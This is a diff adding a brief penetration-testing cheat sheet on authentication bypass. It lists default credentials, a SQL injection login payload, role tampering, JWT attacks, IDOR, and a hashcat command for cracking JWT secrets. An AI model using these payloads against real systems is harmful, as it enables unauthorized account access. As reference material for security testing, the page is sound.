@@ -1,0 +1,24 @@
+---
+title: "Authentication Bypass"
+---
+
+Weak auth logic, defaults, and injection all get you in.
+
+```text
+- Default creds: admin:admin, admin:password, tomcat:tomcat, root:root
+- SQLi login bypass:  ' OR '1'='1'-- -   as username
+- Response/param tamper: role=user -> role=admin, forced browsing to /admin
+- JWT: alg=none, weak HMAC secret (crack with hashcat -m 16500), kid path traversal
+- IDOR: change the id in the request to access other users' objects
+```
+
+## JWT quick checks
+
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt   # crack HS256 secret
+# then forge with the recovered secret (jwt.io / pyjwt)
+```
+
+<Warning>
+Password reset and "remember me" flows are common bypass points — predictable tokens, host-header poisoning of reset links, and user-enumeration via differing error messages.
+</Warning>
